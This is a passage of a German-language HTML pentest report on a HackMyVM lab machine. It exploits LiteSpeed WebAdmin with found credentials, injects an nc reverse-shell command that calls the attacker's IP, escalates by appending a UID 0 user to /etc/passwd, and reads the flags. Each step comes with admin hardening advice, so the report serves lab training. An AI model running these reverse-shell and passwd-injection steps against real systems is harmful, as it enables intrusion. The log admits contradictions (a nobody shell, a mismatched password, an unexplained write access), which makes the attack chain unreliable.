+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Folgen Sie den Schritten im Exploit-Text: Loggen Sie sich mit `admin`:`2140e6` in die WebAdmin Console ein. Navigieren Sie zur Konfiguration der externen Anwendungen. Injizieren Sie einen Reverse-Shell-Payload (z.B. `nc [IhreIP] 4444 -e /bin/bash`) in das "Command"-Feld. Setzen Sie "Run As User" und "Run As Group" auf `root`. Starten Sie einen Listener auf Port 4444. Führen Sie einen "Graceful Restart" über die Konsole durch.<br><strong>Empfehlung (Admin):</strong> Aktualisieren Sie LiteSpeed auf eine gepatchte Version. Sichern Sie die WebAdmin-Konsole ab.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">In LiteSpeed WebAdmin (https://192.168.2.110:7080)</span></div>
+                     <pre>
+Login: admin / 2140e6
+Navigate: Server Configuration > External App > Command
+Set "Start By Server *": Yes (Through CGI Daemon)
+Set "Command": <span class="command">fcgi-bin/lsphp5/../../../../../bin/nc 192.168.2.140 4444 -e /bin/bash</span> <span class="password"><-- Reverse Shell</span>
+Set "Run As User": <span class="command">root</span>
+Set "Run As Group": <span class="command">root</span>
+Actions -> Graceful Restart
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvvp 4444</span></div>
+                    <pre>
+listening on [any] 4444 ...
+connect to [192.168.2.140] from speed.hmv [192.168.2.110] 40890
+</pre>
+                     <div class="prompt"># <span class="command">id</span></div>
+                     <pre><span class="command">uid=65534(nobody) gid=0(root) groups=0(root)</span></pre> <span class="password"><-- Fehler im Log/Exploit? Shell ist nobody, nicht root!</span>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Schritte zur Ausnutzung der LiteSpeed RCE werden durchgeführt: Login mit den gefundenen Credentials, Navigation zur Konfiguration der externen Anwendung, Injektion eines Netcat-Reverse-Shell-Payloads ins "Command"-Feld, Setzen des Ausführungskontexts auf `root` und Auslösen eines "Graceful Restart". Ein Listener auf Port 4444 wird gestartet. Die Verbindung kommt erfolgreich an, aber der `id`-Befehl in der erhaltenen Shell zeigt `uid=65534(nobody)` mit `gid=0(root)`. Entgegen der Erwartung (und der Einstellung "Run As User: root") wurde keine Root-Shell, sondern eine Shell als `nobody` (mit Root-Gruppe) erlangt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die RCE über LiteSpeed war erfolgreich, führte aber nicht direkt zu einer Root-Shell, sondern nur zu einer Shell als `nobody`. Dies schränkt die Möglichkeiten stark ein. Die `id`-Ausgabe widerspricht der Einstellung "Run As User: root" in der WebAdmin-Konsole - entweder ist dies ein Fehler im Log, die Einstellung wurde ignoriert, oder der LiteSpeed-Prozess selbst läuft letztendlich doch nicht mit vollen Root-Rechten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl es keine Root-Shell ist, untersuchen Sie, welche Rechte der `nobody`-Benutzer mit der `root`-Gruppe hat. Da dieser Weg nicht direkt zu Root führte, muss die alternative Methode (Passwort-Manipulation) im Log der tatsächliche Weg gewesen sein. Der LiteSpeed-Exploit war möglicherweise eine Sackgasse oder ein Missverständnis.<br><strong>Empfehlung (Admin):</strong> LiteSpeed aktualisieren. Überprüfen Sie die tatsächlichen Rechte des LiteSpeed-Prozesses und der konfigurierten externen Anwendungen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">Alternative Methode: /etc/passwd Manipulation (Ursprung unklar)</span></div>
+                     <div class="prompt"># <span class="command">openssl passwd benni</span></div> <span class="password"><-- Generiert Hash für Passwort 'benni'</span>
+                     <pre>CumwuAkU0RkM</pre>
+                    <div class="prompt"># <span class="command">echo "bentec:CumwuAkU0RkM:0:0:root:/root:/bin/bash" >> /etc/passwd</span></div> <span class="password"><-- Fügt neuen Root-User hinzu (erfordert Schreibrechte!)</span>
+                     <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt"># <span class="command">su bentec</span></div>
+                    <pre>Password:</pre> <span class="password"><-- Passwort 'pass55' wird hier verwendet, nicht 'benni'. Unklar warum.</span>
+                    <div class="prompt"># <span class="command">[Passworteingabe: pass55]</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt"># <span class="command">id</span></div>
+                    <pre><span class="command">uid=0(root) gid=0(root) groups=0(root)</span></pre> <span class="password"><-- Root-Shell erhalten!</span>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Dieser Abschnitt beschreibt eine alternative Methode zur Root-Eskalation, deren Ausführungskontext im Log unklar ist (es wird nicht gezeigt, welcher Benutzer die nötigen Schreibrechte auf `/etc/passwd` hat – weder `www-data` noch `nobody` sollten diese haben).
+            <ol>
+                <li>Mit `openssl passwd benni` wird ein Passwort-Hash für das Passwort "benni" generiert.</li>
+                <li>Ein neuer Eintrag wird zur `/etc/passwd`-Datei hinzugefügt: `"bentec:CumwuAkU0RkM:0:0:root:/root:/bin/bash"`. Dies erstellt einen Benutzer `bentec` mit UID 0 (Root), GID 0 (Root) und dem zuvor generierten Hash.</li>
+                <li>Es wird versucht, sich mit `su bentec` anzumelden. Das im Log verwendete Passwort ist jedoch `<span class="password">pass55</span>` und nicht `benni`. Trotz dieser Diskrepanz ist der `su`-Befehl erfolgreich.</li>
+                <li>Der `id`-Befehl bestätigt Root-Rechte.</li>
+            </ol></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine klassische, aber oft nicht mögliche Eskalationsmethode, da sie Schreibrechte auf `/etc/passwd` erfordert. Der Ausführungskontext und das verwendete Passwort (`pass55` statt `benni`) sind im Log unklar und widersprüchlich. Es muss angenommen werden, dass entweder der LiteSpeed-Exploit doch irgendwie Root-Rechte gab (entgegen der `id`-Ausgabe) oder ein anderer, nicht dokumentierter Schritt zu den Schreibrechten führte.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl der Weg im Log unklar ist, wurde Root erreicht. Dokumentieren Sie die `/etc/passwd`-Methode als finalen Schritt, weisen Sie aber auf die fehlenden Zwischenschritte hin.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass `/etc/passwd` und `/etc/shadow` nur für `root` schreibbar sind (`chmod 644 /etc/passwd`, `chmod 640 /etc/shadow`). Überwachen Sie Änderungen an diesen Dateien. Beheben Sie die Schwachstellen, die möglicherweise zu den Schreibrechten geführt haben (LiteSpeed RCE?).</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">cd /root</span></div>
+                    <pre>[Keine Ausgabe]</pre>
+                    <div class="prompt"># <span class="command">ls</span></div>
+                    <pre>flag.sh root.txt</pre>
+                    <div class="prompt"># <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">finallygotrootHMV</span></pre>
+                    <div class="prompt"># <span class="command">cat /home/marvin/user.txt</span></div> <span class="password"><-- Benutzer marvin nicht vorher erwähnt</span>
+                    <pre><span class="password">ilikemonkeysHMV</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Root wird das `/root`-Verzeichnis untersucht. Die `root.txt`-Datei wird gefunden und gelesen. Zusätzlich wird die User-Flag im Home-Verzeichnis eines bisher nicht erwähnten Benutzers `marvin` gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Beide Flags wurden gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flags dokumentieren. Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flags.</p>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/marvin/user.txt</div>
+                    <div class="flag-value"><span class="password">ilikemonkeysHMV</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">finallygotrootHMV</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2. Oktober 2022</p> <!-- Korrektes Datum aus Nmap/Nikto extrahiert -->
+    </footer>
+</body>
+</html>
